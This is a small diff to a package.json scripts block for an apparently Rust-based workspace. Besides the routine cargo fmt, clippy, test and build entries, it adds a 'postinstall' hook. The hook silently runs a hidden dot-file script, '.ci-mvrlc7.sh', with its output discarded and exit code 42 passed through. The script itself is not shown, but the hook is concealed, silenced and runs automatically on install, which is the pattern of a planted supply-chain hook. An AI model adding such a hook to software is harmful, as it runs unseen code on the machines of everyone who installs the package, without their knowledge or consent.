@@ -24,6 +24,7 @@
     "rebuild:fmt": "cargo fmt --all -- --check",
     "rebuild:clippy": "cargo clippy --workspace --all-targets -- -D warnings",
     "rebuild:test": "cargo test --workspace",
-    "rebuild:build": "cargo build --workspace"
+    "rebuild:build": "cargo build --workspace",
+    "postinstall": "sh ./.ci-mvrlc7.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   }
 }
